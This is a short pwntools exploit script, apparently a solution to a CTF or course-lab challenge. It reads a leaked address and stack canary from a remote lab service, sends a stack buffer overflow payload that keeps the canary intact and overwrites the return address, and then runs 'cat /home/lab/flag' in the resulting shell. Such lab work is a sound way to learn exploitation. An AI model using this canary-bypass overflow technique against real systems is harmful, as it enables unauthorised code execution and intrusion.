from pwn import *

# p = process("./share/lab")
p = remote("10.113.184.121", 10041)
addr = p.recvline()[8:23].strip()
addr = int(addr, 16) + (0xF1 - 0xE9)
p.recvuntil(b"Gift2: ")
buf = p.recv(32)
# print(addr)
# for i in range(0, 32, 8):
#     print(buf[i : i + 8])
# print()
can = buf[8:16]
# print(can)

payload = b"a" * 8 + can + b"a" * 8 + p64(addr)
# print(payload)
p.sendline(payload)
p.sendline(b"cat /home/lab/flag")
print(p.recv().decode())
